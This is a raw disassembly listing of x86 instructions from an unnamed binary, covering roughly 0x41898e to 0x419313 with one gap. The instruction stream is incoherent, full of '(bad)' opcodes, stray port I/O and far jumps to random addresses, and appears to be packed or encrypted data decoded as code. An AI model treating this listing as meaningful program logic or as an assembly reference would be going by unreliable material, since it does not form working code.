  41898e:	shl    BYTE PTR [ebx+0x41],cl
  418991:	sbb    eax,0xe42f223c
  418996:	or     al,ch
  418998:	repz enter 0x6293,0xb1
  41899d:	or     bl,BYTE PTR [edi-0x79ec0fa0]
  4189a3:	fidiv  WORD PTR [edi]
  4189a5:	lods   al,BYTE PTR ds:[esi]
  4189a6:	add    dl,BYTE PTR [edx-0x6ef40454]
  4189ac:	shr    BYTE PTR [ecx+0x6afdd7cb],1
  4189b2:	(bad)  
  4189b3:	neg    dl
  4189b5:	or     eax,ecx
  4189b7:	mov    eax,0xbe84b880
  4189bc:	sar    al,cl
  4189be:	mov    ch,0xb3
  4189c0:	push   0xfffffffa
  4189c2:	les    ecx,FWORD PTR ss:[esi+0x21]
  4189c6:	add    ah,cl
  4189c8:	push   0xe
  4189ca:	dec    ebx
  4189cb:	push   es
  4189cc:	nop
  4189cd:	fiadd  DWORD PTR [esi+0x329f0c1]
  4189d3:	cdq    
  4189d4:	(bad)  
  4189d5:	clc    
  4189d6:	inc    edx
  4189d7:	mov    eax,0xe5d745ef
  4189dc:	add    cl,BYTE PTR [edi-0x28]
  4189df:	push   edx
  4189e0:	dec    edx
  4189e1:	clc    
  4189e2:	out    dx,eax
  4189e3:	inc    ebx
  4189e4:	ror    BYTE PTR [edx+eax*2-0x24],0x93
  4189e9:	jecxz  0x418981
  4189eb:	fwait
  4189ec:	xor    DWORD PTR [ebp+0x34],ebp
  4189ef:	cdq    
  4189f0:	push   0x877a2620
  4189f5:	stc    
  4189f6:	dec    ecx
  4189f7:	in     eax,0xb4
  4189f9:	fld    QWORD PTR [esi]
  4189fb:	jmp    0xb6b9b86f
  418a00:	jnp    0x41898e
  418a02:	mov    ?,WORD PTR [edx]
  418a04:	sbb    DWORD PTR [esi],edi
  418a06:	sub    al,0xa4
  418a08:	imul   BYTE PTR [eax]
  418a0a:	dec    ecx
  418a0b:	iret   
  418a0c:	sub    dh,BYTE PTR [edi]
  418a0e:	mov    bl,0xc4
  418a10:	xor    bl,BYTE PTR [eax]
  418a12:	mov    al,0x1a
  418a14:	add    dl,bl
  418a16:	aam    0xf5
  418a18:	cmp    ecx,0xf5011662
  418a1e:	repnz mov DWORD PTR [esi],edi
  418a21:	inc    ecx
  418a22:	dec    esp
  418a23:	bound  esi,QWORD PTR [ecx+0x7f]
  418a26:	pop    ebp
  418a27:	sbb    ebx,edx
  418a29:	or     DWORD PTR [edi],edx
  418a2b:	sbb    DWORD PTR [ebp-0x4ee94aba],ecx
  418a31:	mov    ds:0x3789d766,eax
  418a36:	mov    BYTE PTR [esi+eax*4],cl
  418a39:	in     eax,0x11
  418a3b:	retf   
  418a3c:	mov    cl,0xa9
  418a3e:	pusha  
  418a3f:	dec    edi
  418a40:	ds (bad) 
  418a43:	push   ebx
  418a44:	stos   DWORD PTR es:[edi],eax
  418a45:	aas    
  418a46:	in     eax,0x2e
  418a48:	inc    ecx
  418a49:	sub    esp,DWORD PTR [ebx-0x4a82a731]
  418a4f:	mov    dl,0x8b
  418a51:	dec    edi
  418a52:	mov    ds:0x44ef6c38,eax
  418a58:	mov    bh,0x5f
  418a5a:	in     eax,dx
  418a5b:	jns    0x418a2d
  418a5d:	aas    
  418a5e:	test   BYTE PTR [eax-0x3],0x98
  418a62:	mov    edi,0x884d6aa7
  418a67:	call   0x4cc2:0x46a8e918
  418a6e:	div    ebp
  418a70:	(bad)  
  418a71:	outs   dx,DWORD PTR ds:[esi]
  418a72:	mov    WORD PTR [ebp-0x5d],gs
  418a75:	push   edx
  418a76:	cmp    ecx,DWORD PTR [eax-0x273f8978]
  418a7c:	xor    DWORD PTR [edi+edx*8-0x43bf883d],ecx
  418a83:	push   ebx
  418a84:	repz div DWORD PTR [ebp+0x3d9f4bc3]
  418a8b:	mov    cl,0x10
  418a8d:	pop    ecx
  418a8e:	mov    eax,ds:0x8bdf4b39
  418a93:	mov    ecx,0x5ad30e14
  418a98:	jbe    0x418a87
  418a9a:	adc    ah,BYTE PTR ds:0x9eff1db8
  418aa0:	dec    ebp
  418aa1:	dec    esp
  418aa2:	push   0x57
  418aa4:	popa   
  418aa5:	or     al,0x46
  418aa7:	mov    esi,0xa0e38aa4
  418aac:	xchg   edx,eax
  418aad:	push   ds
  418aae:	retf   
  418aaf:	mov    BYTE PTR [ecx+0x57d99edf],dh
  418ab5:	jmp    0xcd6b:0xa5694658
  418abc:	test   edx,edx
  418abe:	xchg   edx,eax
  418abf:	and    eax,0x8986f55d
  418ac4:	push   ecx
  418ac5:	inc    edi
  418ac6:	shr    eax,0x7f
  418ac9:	jg     0x418ab8
  418acb:	call   0x89e6:0x28f75b45
  418ad2:	iret   
  418ad3:	fbstp  TBYTE PTR [edx+eiz*1]
  418ad6:	mov    esp,0xde645df9
  418adb:	dec    edx
  418adc:	jecxz  0x418a89
  418ade:	scas   al,BYTE PTR es:[edi]
  418adf:	dec    ebx
  418ae0:	push   esi
  418ae1:	in     eax,dx
  418ae2:	add    al,0xcc
  418ae4:	push   esp
  418ae5:	add    ebp,0x8d35b365
  418aeb:	aam    0x22
  418aed:	retf   
  418aee:	arpl   WORD PTR [ebp+0x5c],di
  418af1:	ret    
  418af2:	ins    DWORD PTR es:[edi],dx
  418af3:	es add dh,0x25
  418af7:	fwait
  418af8:	aam    0x49
  418afa:	rol    DWORD PTR [edi],cl
  418afc:	and    DWORD PTR [ebx-0x68],0xffffffb1
  418b00:	out    0xdb,al
  418b02:	jb     0x418b7d
  418b04:	xor    al,0x64
  418b06:	mov    edi,0x67f6be8e
  418b0b:	repnz cmp ah,ah
  418b0e:	push   edi
  418b0f:	es dec ecx
  418b11:	test   DWORD PTR [edi-0x35b99c3d],0xceca81aa
  418b1b:	dec    ebp
  418b1c:	psllq  mm3,QWORD PTR [esi-0x46c40fc]
  418b23:	pop    eax
  418b24:	adc    eax,0x2c701478
  418b29:	inc    eax
  418b2a:	ss in  eax,dx
  418b2c:	jl     0x418ac8
  418b2e:	mov    al,0x9f
  418b30:	stc    
  418b31:	sbb    DWORD PTR [ebx+eiz*2+0x59],ebp
  418b35:	bound  edx,QWORD PTR [ebp-0x42c2edf4]
  418b3b:	ret    0x5b6b
  418b3e:	mov    WORD PTR [eax],es
  418b40:	test   DWORD PTR [ebp+ebx*4+0x7c],0x3eacc742
  418b48:	and    esp,DWORD PTR [edi+0x3ae85897]
  418b4e:	mov    ebx,DWORD PTR [esi+edi*1-0x22a6257a]
  418b55:	aam    0xa2
  418b57:	pop    ebp
  418b58:	fld    TBYTE PTR [esi-0x1f]
  418b5b:	inc    ebx
  418b5c:	pop    ds
  418b5d:	mov    BYTE PTR [edx+0x70],ah
  418b60:	jmp    0x418b6c
  418b62:	jae    0x418b9b
  418b64:	popa   
  418b65:	arpl   di,si
  418b67:	jge    0x418be4
  418b69:	out    0xec,al
  418b6b:	add    eax,DWORD PTR [ecx+0x589caf44]
  418b71:	mov    ?,WORD PTR [ecx-0x21290ea8]
  418b77:	push   ebp
  418b78:	inc    ebx
  418b79:	add    BYTE PTR [eax-0x72],ah
  418b7c:	push   0xb64dd37a
  418b81:	shl    ebp,0x1a
  418b84:	jno    0x437d03ff
  418b8a:	pop    edx
  418b8b:	or     DWORD PTR [ebx],esp
  418b8d:	gs jae 0x418b14
  418b90:	or     ah,0x91
  418b93:	dec    ebx
  418b94:	scas   al,BYTE PTR es:[edi]
  418b95:	idiv   BYTE PTR [eax]
  418b97:	daa    
  418b98:	inc    esi
  418b99:	scas   al,BYTE PTR es:[edi]
  418b9a:	ins    BYTE PTR es:[edi],dx
  418b9b:	push   edx
  418b9c:	je     0x418b6d
  418b9e:	pop    ds
  418b9f:	cmp    ecx,ecx
  418ba1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ba2:	mov    edi,0xc6303f5d
  418ba7:	xor    al,BYTE PTR [edi+0x3664b918]
  418bad:	dec    ecx
  418bae:	je     0x418b89
  418bb0:	mov    DWORD PTR [eax],edi
  418bb2:	in     al,0x84
  418bb4:	mov    al,0x65
  418bb6:	outs   dx,BYTE PTR ds:[esi]
  418bb7:	push   es
  418bb8:	xor    DWORD PTR [eax],edi
  418bba:	dec    ecx
  418bbb:	adc    eax,0x4a2c6094
  418bc0:	mov    al,BYTE PTR [eax+0x61]
  418bc3:	pop    ebx
  418bc4:	xchg   ebp,eax
  418bc5:	jmp    0x6846:0x71fc5a30
  418bcc:	inc    edi
  418bcd:	ds mov ebp,0x4d452450
  418bd3:	stc    
  418bd4:	or     BYTE PTR [ecx+0x4da87bc1],al
  418bda:	sub    al,0xce
  418bdc:	sub    DWORD PTR [esi+0x5d737f00],edx
  418be2:	sub    bh,cl
  418be4:	xchg   ebx,eax
  418be5:	mov    dl,0x7f
  418be7:	mov    eax,ds:0xf537ddf0
  418bec:	dec    edi
  418bee:	fmul   DWORD PTR ds:0x6e269545
  418bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bf5:	pop    ecx
  418bf6:	add    ebx,edx
  418bf8:	jmp    FWORD PTR [esi-0xae89738]
  418bfe:	pop    ecx
  418bff:	mov    edi,0xb4fd058a
  418c04:	jae    0x418c5c
  418c06:	sti    
  418c07:	clc    
  418c08:	push   esp
  418c09:	push   esp
  418c0a:	fsub   QWORD PTR [ebx]
  418c0c:	mov    edi,0xcf35d2f0
  418c11:	popa   
  418c12:	(bad)  
  418c13:	neg    DWORD PTR [ebx+esi*4+0x254e650]
  418c1a:	cmp    BYTE PTR [ebx],dl
  418c1c:	cmp    al,dl
  418c1e:	pop    esi
  418c1f:	dec    ebx
  418c20:	sub    al,0x6b
  418c22:	les    esp,FWORD PTR [ebx+0x4faa1168]
  418c28:	les    edi,FWORD PTR [ecx]
  418c2a:	push   es
  418c2b:	inc    edi
  418c2c:	in     eax,0x91
  418c2e:	ds pop eax
  418c30:	push   cs
  418c31:	(bad)  
  418c33:	mov    edx,0xeefde280
  418c38:	xorps  xmm5,XMMWORD PTR [esp+ebx*8]
  418c3c:	loope  0x418c47
  418c3e:	popf   
  418c3f:	mov    ah,0x5b
  418c41:	addr16 mov ds:0xa410,al
  418c45:	scas   al,BYTE PTR es:[edi]
  418c46:	enter  0x399c,0x1a
  418c4a:	sbb    eax,0xf89639a4
  418c4f:	inc    ebp
  418c50:	lahf   
  418c51:	jge    0x418c0e
  418c53:	add    eax,0x60c622d6
  418c58:	iret   
  418c59:	pop    esp
  418c5a:	mov    esi,0xddd803e8
  418c5f:	xchg   edx,eax
  418c60:	stc    
  418c61:	and    BYTE PTR [esi],al
  418c63:	je     0x418c4b
  418c65:	ins    DWORD PTR es:[edi],dx
  418c66:	inc    edi
  418c67:	jg     0x418c60
  418c69:	and    al,0x1b
  418c6b:	and    BYTE PTR [edx],0x13
  418c6e:	adc    BYTE PTR [esi-0x2e],dh
  418c71:	adc    dh,BYTE PTR es:[ebp-0x28]
  418c75:	jb     0x418cf4
  418c77:	adc    al,BYTE PTR [edx]
  418c79:	push   esp
  418c7a:	into   
  418c7b:	mov    dl,0xf4
  418c7d:	lds    esp,FWORD PTR [ebx]
  418c7f:	fwait
  418c80:	stos   DWORD PTR es:[edi],eax
  418c81:	push   0x2b
  418c83:	fucomp st(7)
  418c85:	jb     0x418cda
  418c87:	push   0x1bb628fb
  418c8c:	sbb    DWORD PTR [ebx-0x63],ecx
  418c8f:	mov    cl,0x41
  418c91:	(bad)  
  418c92:	push   ds
  418c93:	mov    ch,0xaf
  418c95:	enter  0x99d1,0xe
  418c99:	js     0x418d07
  418c9b:	ret    0x6ebf
  418c9e:	mov    edx,0x33a32fda
  418ca3:	je     0x418d05
  418ca5:	jmp    0x418ced
  418ca7:	push   ss
  418ca8:	fimul  WORD PTR [edx-0x6ff52eaa]
  418cae:	fs jmp 0xa132:0x73038c48
  418cb6:	gs pop esi
  418cb8:	arpl   WORD PTR [esi],dx
  418cba:	cs ret 
  418cbc:	pop    edx
  418cbd:	rcl    DWORD PTR [ebp+0x64],cl
  418cc0:	sbb    ebx,DWORD PTR [ebx]
  418cc2:	stos   DWORD PTR es:[edi],eax
  418cc3:	jne    0x418c6a
  418cc5:	(bad)  [ebx-0x53]
  418cc8:	std    
  418cc9:	or     DWORD PTR [ebx],0x3b
  418ccc:	add    ebp,DWORD PTR [ecx-0x1df0d16b]
  418cd2:	adc    cl,BYTE PTR [ebx+0x62]
  418cd5:	shl    BYTE PTR [esi+0x27],0xc9
  418cd9:	xchg   esp,eax
  418cda:	lods   al,BYTE PTR ds:[esi]
  418cdb:	in     eax,dx
  418cdc:	adc    edx,ebp
  418cde:	cmc    
  418cdf:	popf   
  418ce0:	push   eax
  418ce1:	push   ebx
  418ce2:	cld    
  418ce3:	clc    
  418ce4:	(bad)  
  418ce5:	les    edx,FWORD PTR [edx]
  418ce7:	push   0xbfb7bf8e
  418cec:	mov    esi,0x1c437011
  418cf1:	scas   al,BYTE PTR es:[edi]
  418cf2:	or     dh,BYTE PTR [esi]
  418cf4:	sub    edi,0xffffff94
  418cf7:	outs   dx,BYTE PTR ds:[esi]
  418cf8:	xchg   esp,esi
  418cfa:	inc    edx
  418cfb:	into   
  418cfc:	pop    ecx
  418cfd:	xor    al,0x0
  418cff:	xchg   BYTE PTR [ebp+0x1e434e6b],dh
  418d05:	lea    esp,[edi+0x47c0a97c]
  418d0b:	inc    esp
  418d0c:	scas   eax,DWORD PTR es:[edi]
  418d0d:	xchg   edx,eax
  418d0e:	mov    ecx,0xae9a0bdb
  418d13:	sti    
  418d14:	inc    ebx
  418d15:	popa   
  418d16:	sub    eax,0xc82ccc35
  418d1b:	je     0x418d89
  418d1d:	scas   eax,DWORD PTR es:[edi]
  418d1e:	iret   
  418d1f:	test   eax,0xec86d250
  418d24:	xlat   BYTE PTR ds:[ebx]
  418d25:	retf   
  418d26:	push   es
  418d27:	test   DWORD PTR [eax],eax
  418d29:	mov    ds:0x4c3a8f40,al
  418d2e:	xchg   edi,eax
  418d2f:	jmp    FWORD PTR [eax-0x60]
  418d32:	hlt    
  418d33:	pop    eax
  418d34:	xor    DWORD PTR [edx],esp
  418d36:	loope  0x418d69
  418d38:	outs   dx,BYTE PTR ds:[esi]
  418d39:	mov    bh,0xf0
  418d3b:	js     0x418d01
  418d3d:	pop    es
  418d3e:	std    
  418d3f:	xor    BYTE PTR [ebp+0x75068d05],ah
  418d45:	ror    DWORD PTR [edi+ebp*8],0x43
  418d49:	push   ebx
  418d4a:	inc    esp
  418d4c:	(bad)  
  418d4d:	and    ch,BYTE PTR [ebx+edi*2+0x56656b72]
  418d54:	sar    BYTE PTR [ebp-0x26fd0db9],0xc3
  418d5b:	popa   
  418d5c:	fsubr  QWORD PTR [esi-0x43]
  418d5f:	pusha  
  418d60:	mov    BYTE PTR [ebp+0x650d038c],ah
  418d66:	or     esi,DWORD PTR [ebx+0x3c]
  418d69:	sbb    al,0x93
  418d6b:	and    DWORD PTR [esi+0x3b],0xffffffdc
  418d6f:	retf   
  418d70:	mov    ecx,ebp
  418d72:	lea    ebp,[edi-0xe9e3ce3]
  418d78:	lods   eax,DWORD PTR ds:[esi]
  418d79:	pusha  
  418d7a:	lods   al,BYTE PTR ds:[esi]
  418d7b:	les    ebp,FWORD PTR [esi]
  418d7d:	retf   0xa454
  418d80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d81:	test   al,0xd1
  418d83:	(bad)
  418d86:	std    
  418d87:	aam    0xc5
  418d89:	jbe    0x418d0d
  418d8b:	fistp  QWORD PTR [edi-0x5f71e8c]
  418d91:	enter  0x393f,0x6a
  418d95:	repnz mov cl,0x64
  418d98:	test   bh,bl
  418d9a:	into   
  418d9b:	mov    esi,DWORD PTR ds:0xb2c0cb4a
  418da1:	cmp    cl,BYTE PTR [edx+ecx*8-0x75]
  418da5:	das    
  418da6:	in     al,dx
  418da7:	sbb    al,0x87
  418da9:	mov    fs,ecx
  418dab:	fcomp  DWORD PTR [ecx]
  418dad:	pop    es
  418dae:	cmc    
  418daf:	pop    edi
  418db0:	fcmove st,st(3)
  418db2:	loopne 0x418dbb
  418db4:	dec    ebp
  418db5:	std    
  418db6:	pop    eax
  418db7:	pop    ss
  418db8:	in     eax,0x6a
  418dba:	push   eax
  418dbb:	mov    ebp,0x3be26e69
  418dc0:	loope  0x418d4d
  418dc2:	jmp    0x418dbc
  418dc4:	out    0xb2,al
  418dc6:	and    DWORD PTR [esi],edx
  418dc8:	fst    DWORD PTR [edx+0x1454119b]
  418dce:	mov    edi,0xcfec9d52
  418dd3:	dec    esi
  418dd4:	std    
  418dd5:	ins    BYTE PTR es:[edi],dx
  418dd6:	pushf  
  418dd7:	shl    dh,1
  418dd9:	cdq    
  418dda:	in     eax,dx
  418ddb:	cmp    eax,0x94fdb3a1
  418de0:	fisttp QWORD PTR [ecx-0x2215d25b]
  418de6:	pop    ds
  418de7:	fistp  WORD PTR [esi+0x71]
  418dea:	or     cl,BYTE PTR [eax+0x10]
  418ded:	in     al,0x45
  418def:	retf   
  418df0:	sar    BYTE PTR [eax+0x121457b3],cl
  418df6:	xacquire xchg DWORD PTR [ebx+ebp*4-0x51],edi
  418dfb:	jmp    0x418e49
  418dfd:	or     eax,0x317e9c0
  418e02:	sbb    DWORD PTR [esi-0x4df16db5],0xb01a7d1a
  418e0c:	test   eax,0x81aaa89b
  418e11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e12:	retf   0xfdfd
  418e15:	mov    eax,ds:0xdfc0f4a3
  418e1a:	pop    edi
  418e1b:	dec    edx
  418e1c:	call   0xcb39f0cd
  418e21:	clc    
  418e22:	push   es
  418e23:	mov    esi,0x49e0fe48
  418e28:	jno    0x418e76
  418e2a:	push   ebp
  418e2b:	ret    0xea96
  418e2e:	dec    esi
  418e2f:	xor    ebx,DWORD PTR [ecx]
  418e31:	jne    0x418e49
  418e33:	mov    esp,0xd5b6980f
  418e38:	lds    esi,FWORD PTR [ecx+0x4eeaa83a]
  418e3e:	retf   0xd4a8
  418e41:	push   ss
  418e42:	gs xchg ebx,eax
  418e44:	into   
  418e45:	retf   
  418e46:	add    dh,ah
  418e48:	cmovge esp,edx
  418e4b:	push   0x24
  418e4d:	out    0xac,eax
  418e4f:	test   eax,0xe2b5879b
  418e54:	into   
  418e55:	rcl    BYTE PTR [ecx-0x670c9ad9],cl
  418e5b:	cmp    bl,dl
  418e5d:	cmc    
  418e5e:	add    BYTE PTR [ecx+0x3d],bh
  418e61:	jns    0x418e10
  418e63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e64:	pop    ebx
  418e65:	dec    DWORD PTR [ecx+0x1083aac7]
  418e6b:	out    dx,al
  418e6c:	cmc    
  418e6d:	mov    ds:0xf86ba680,eax
  418e72:	test   eax,0x92170e43
  418e77:	fmul   QWORD PTR [edi+0x13]
  418e7a:	scas   eax,DWORD PTR es:[edi]
  418e7b:	sub    DWORD PTR [ecx],esp
  418e7d:	mov    ebp,edi
  418e7f:	sbb    ebp,DWORD PTR [edi-0x27f0777f]
  418e85:	sub    DWORD PTR [ecx+0x30],ebp
  418e88:	dec    ebx
  418e89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e8a:	lods   al,BYTE PTR ds:[esi]
  418e8b:	lock mov esp,0x34f420fb
  418e91:	inc    esp
  418e92:	neg    BYTE PTR [eax]
  418e94:	out    dx,eax
  418e95:	ficom  WORD PTR [ebp+ebx*8-0x74]
  418e99:	or     al,0xdd
  418e9b:	cli    
  418e9c:	js     0x418ed5
  418e9e:	loope  0x418e91
  418ea0:	inc    esp
  418ea1:	sbb    bx,WORD PTR [eax-0x78]
  418ea5:	sub    BYTE PTR [eax-0x4f],al
  418ea8:	loope  0x418f19
  418eaa:	mov    ds:0x9543b3c8,eax
  418eaf:	pop    es
  418eb0:	jns    0x418f03
  418eb2:	hlt    
  418eb3:	js     0x418ec0
  418eb5:	inc    edi
  418eb6:	js     0x418e57
  418eb8:	pop    ecx
  418eb9:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ebb:	stos   BYTE PTR es:[edi],al
  418ebc:	ja     0x418ec7
  418ebe:	xor    ah,BYTE PTR [esp+ebp*2]
  418ec1:	arpl   WORD PTR [ecx],di
  418ec3:	lock loope 0x418e5d
  418ec6:	mov    dl,0x8e
  418ec8:	sbb    esi,ebp
  418eca:	bound  edi,QWORD PTR [ebx+0x3f2e9e52]
  418ed0:	push   cs
  418ed1:	xchg   edi,eax
  418ed2:	pop    ecx
  418ed3:	dec    ecx
  418ed4:	mov    edx,0x1af2fcec
  418ed9:	sub    al,0x94
  418edb:	ds aad 0xa9
  418ede:	es scas eax,DWORD PTR es:[edi]
  418ee0:	fwait
  418ee1:	jmp    0xb10e5a98
  418ee6:	dec    esi
  418ee7:	jl     0x418f2e
  418ee9:	sub    eax,0xa9db9ea8
  418eee:	cdq    
  418eef:	cmp    al,0xe5
  418ef1:	cdq    
  418ef2:	fadd   QWORD PTR [ecx]
  418ef4:	pop    es
  418ef5:	mov    bp,0xb4f7
  418ef9:	push   edx
  418efa:	test   al,0xb7
  418efc:	mov    BYTE PTR [si-0x63],dh
  418f00:	or     bl,cl
  418f02:	inc    ebp
  418f03:	ins    BYTE PTR es:[edi],dx
  418f04:	jle    0x418eee
  418f06:	fwait
  418f07:	dec    esp
  418f08:	inc    edx
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	xchg   ebp,eax
  418f0b:	mov    edi,0xee71d6a0
  418f10:	(bad)  
  418f11:	adc    BYTE PTR [bp+si-0xb],0xa0
  418f16:	mov    fs,WORD PTR [ebx-0x60]
  418f19:	mov    ch,0x2e
  418f1b:	es je  0x418f35
  418f1e:	xchg   BYTE PTR [edi],bl
  418f20:	or     BYTE PTR [edi],dh
  418f22:	je     0x418f79
  418f24:	retf   
  418f25:	fisttp QWORD PTR [ecx+0x6f82ed03]
  418f2b:	adc    BYTE PTR [eax-0x5e10c7cd],cl
  418f31:	out    0x44,eax
  418f33:	adc    al,0x75
  418f35:	dec    ebx
  418f36:	add    eax,0x81de537d
  418f3b:	lods   eax,DWORD PTR ds:[esi]
  418f3c:	pop    eax
  418f3d:	or     DWORD PTR [esi],esi
  418f3f:	into   
  418f40:	cmp    eax,0xbac8120b
  418f45:	ds pop ecx
  418f47:	pop    ss
  418f48:	jno    0x418eec
  418f4a:	arpl   cx,bp
  418f4c:	xor    eax,ebp
  418f4e:	push   ds
  418f4f:	dec    edx
  418f50:	add    esp,DWORD PTR [ebx+ebx*4]
  418f53:	push   edx
  418f54:	dec    eax
  418f55:	ret    0xfd35
  418f58:	adc    BYTE PTR [ebp+0x48363b87],dl
  418f5e:	xor    eax,0xc7e51e02
  418f63:	pop    edi
  418f64:	jmp    0xdc125358
  418f69:	xor    eax,0x1113e412
  418f6e:	mov    bh,BYTE PTR [ecx-0x49e39728]
  418f74:	(bad)  
  418f75:	je     0x418fc6
  418f77:	out    0xae,al
  418f79:	or     DWORD PTR [edx],eax
  418f7b:	or     bh,BYTE PTR [esi]
  418f7d:	jmp    0x5353f4ea
  418f82:	repz cld 
  418f84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f85:	jge    0x418f2c
  418f87:	bound  esp,QWORD PTR [ebx]
  418f89:	pop    ebp
  418f8a:	jmp    0xfd11bbcd
  418f8f:	or     DWORD PTR [ecx-0x610d3bd1],edx
  418f95:	(bad)  
  418f96:	ds inc esi
  418f98:	push   esi
  418f99:	push   edi
  418f9a:	pop    ecx
  418f9b:	imul   eax,DWORD PTR [ecx+0x3f2f1d1e],0x46ea679f
  418fa5:	mov    dh,0x83
  418fa7:	push   ds
  418fa8:	call   0x4214:0x8eb3a3fe
  418faf:	addr16 dec esi
  418fb1:	push   esi
  418fb2:	inc    ebp
  418fb3:	xor    ebx,edx
  418fb5:	jg     0x41900a
  418fb7:	jecxz  0x418fa7
  418fb9:	and    BYTE PTR [edi+0x6d],bl
  418fbc:	stc    
  418fbd:	pop    ss
  418fbe:	stos   DWORD PTR es:[edi],eax
  418fbf:	fcomp  DWORD PTR [edx-0xd]
  418fc2:	cmp    edi,DWORD PTR [ebx+0x35096b20]
  418fc8:	sub    al,0x13
  418fca:	mov    ebp,0x2aca3779
  418fcf:	xchg   esi,eax
  418fd0:	arpl   WORD PTR [edx-0x24],sp
  418fd3:	push   edi
  418fd4:	xchg   ecx,eax
  418fd5:	xor    eax,0x21da2e96
  418fda:	push   cs
  418fdb:	sbb    dl,BYTE PTR [eax+0x10]
  418fde:	stos   DWORD PTR es:[edi],eax
  418fdf:	pop    esi
  418fe0:	stos   DWORD PTR es:[edi],eax
  418fe1:	push   ebx
  418fe2:	mov    dl,0xdb
  418fe4:	add    esp,DWORD PTR [edx+esi*8+0x67a4f6d7]
  418feb:	cmp    al,0x33
  418fed:	rcr    DWORD PTR [ebx+edi*2-0x6c],0xad
  418ff2:	mov    ds:0x50eadd0a,al
  418ff7:	xchg   ecx,eax
  418ff8:	fld    TBYTE PTR [esp+edi*1]
  418ffb:	mov    cl,0x9
  418ffd:	js     0x419004
  418fff:	sub    ebx,DWORD PTR [ecx-0x4a]
  419002:	mov    ebp,0x5d
	...
  4191d7:	add    BYTE PTR ds:0x773f6240,dl
  4191dd:	aas    
  4191de:	pop    ebp
  4191df:	push   0xffffff86
  4191e1:	jb     0x419245
  4191e3:	stc    
  4191e4:	pop    esi
  4191e5:	add    edi,edx
  4191e7:	shl    BYTE PTR [ecx+0x2200018c],cl
  4191ed:	pop    es
  4191ee:	add    BYTE PTR [eax],al
  4191f0:	inc    ebx
  4191f1:	mov    eax,0x4c04026b
  4191f7:	push   eax
  4191f8:	fwait
  4191f9:	sbb    al,0xe2
  4191fb:	jmp    0xd1b4:0x7882ffff
  419202:	in     eax,dx
  419203:	dec    ebp
  419204:	hlt    
  419205:	aam    0xf1
  419207:	fimul  DWORD PTR ds:0x709bd21e
  41920d:	and    al,bl
  41920f:	fs push 0xd94fc47d
  419215:	(bad)  
  419217:	sub    edx,DWORD PTR [ebx+edx*1+0x60ea4ff7]
  41921e:	push   0x1f
  419220:	adc    ebx,DWORD PTR [ecx-0x6b]
  419223:	inc    esp
  419224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419225:	xchg   BYTE PTR [eax],dh
  419227:	iret   
  419228:	xchg   ebp,eax
  419229:	cmp    DWORD PTR [ecx],eax
  41922b:	xor    edx,DWORD PTR [ebp+0x78]
  41922e:	adc    DWORD PTR [ebx+edx*4+0x25],esp
  419232:	lods   eax,DWORD PTR ds:[esi]
  419233:	data16 in al,dx
  419235:	sbb    al,0x8e
  419237:	popa   
  419238:	test   al,0x82
  41923a:	jecxz  0x4192b9
  41923c:	pop    eax
  41923d:	adc    al,0x69
  41923f:	imul   edi,ebp,0x60
  419242:	ret    
  419243:	push   0x48
  419245:	cmp    al,0x7a
  419247:	xor    dh,BYTE PTR [esi+0x2028e2c3]
  41924d:	adc    al,0x2a
  41924f:	xor    eax,0x57a754ff
  419254:	fisttp DWORD PTR [ecx]
  419256:	sar    bl,0x26
  419259:	jle    0x41928d
  41925b:	in     eax,dx
  41925c:	or     DWORD PTR [eax+esi*8+0x6b],0x74
  419261:	shl    DWORD PTR [edi+0x220bc16d],1
  419267:	aaa    
  419268:	cld    
  419269:	fbstp  TBYTE PTR [edx+0x112dd4b3]
  41926f:	call   0x1d45eeae
  419274:	daa    
  419275:	repz jg 0x4192bb
  419278:	jmp    0x419252
  41927a:	retf   0x70e7
  41927d:	sub    al,0x28
  41927f:	sbb    BYTE PTR [ebp-0x24f65e40],ah
  419285:	lahf   
  419286:	sbb    ah,0xe7
  419289:	xor    BYTE PTR [ebx-0x57],0xf6
  41928d:	mov    WORD PTR [eax-0x5061280d],ss
  419293:	jecxz  0x4192b7
  419295:	push   esi
  419296:	stos   DWORD PTR es:[edi],eax
  419297:	pop    eax
  419298:	leave  
  419299:	popa   
  41929a:	xor    al,0x73
  41929c:	call   DWORD PTR [ebp+ebx*8+0xd7eeab5]
  4192a3:	mov    dl,0xb2
  4192a5:	in     eax,dx
  4192a6:	mov    ?,WORD PTR [eax+0x63614393]
  4192ac:	out    dx,eax
  4192ad:	and    cl,BYTE PTR [eax+0x6f]
  4192b0:	jo     0x41929e
  4192b2:	cmp    BYTE PTR [edi-0x2a56f94e],0xc3
  4192b9:	mov    eax,DWORD PTR [esi]
  4192bb:	sub    ebx,esi
  4192bd:	cmp    eax,0xb4ac3ba0
  4192c2:	div    DWORD PTR [edi+0x6c]
  4192c5:	bound  ecx,QWORD PTR [esi+0x63564bec]
  4192cb:	pop    edx
  4192cc:	test   BYTE PTR [eax+0x4880bc2a],al
  4192d2:	clc    
  4192d3:	mov    dh,0x13
  4192d5:	aas    
  4192d6:	add    eax,0xbd9caecc
  4192db:	xchg   BYTE PTR [edx-0x251e29c6],dh
  4192e1:	dec    esi
  4192e2:	ds sti 
  4192e4:	lea    edi,[eax+edx*4-0x7e]
  4192e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192e9:	add    bl,BYTE PTR ds:0xffdd682f
  4192ef:	(bad)  
  4192f0:	std    
  4192f1:	and    ecx,DWORD PTR [esi+ebp*2]
  4192f4:	jne    0x419337
  4192f6:	mov    bl,0x92
  4192f8:	(bad)  
  4192f9:	(bad)  
  4192fa:	add    ebp,DWORD PTR [ebx-0x16]
  4192fd:	lahf   
  4192fe:	inc    esp
  4192ff:	fdivp  st(6),st
  419301:	call   0x3b08d0d2
  419306:	jae    0x4192f5
  419308:	fld    st(4)
  41930a:	or     ebp,edi
  41930c:	cmc    
  41930d:	lods   eax,DWORD PTR ds:[esi]
  41930e:	aad    0xce
  419310:	ret    0x3ef7
  419313:	ins    DWORD PTR es:[edi],dx
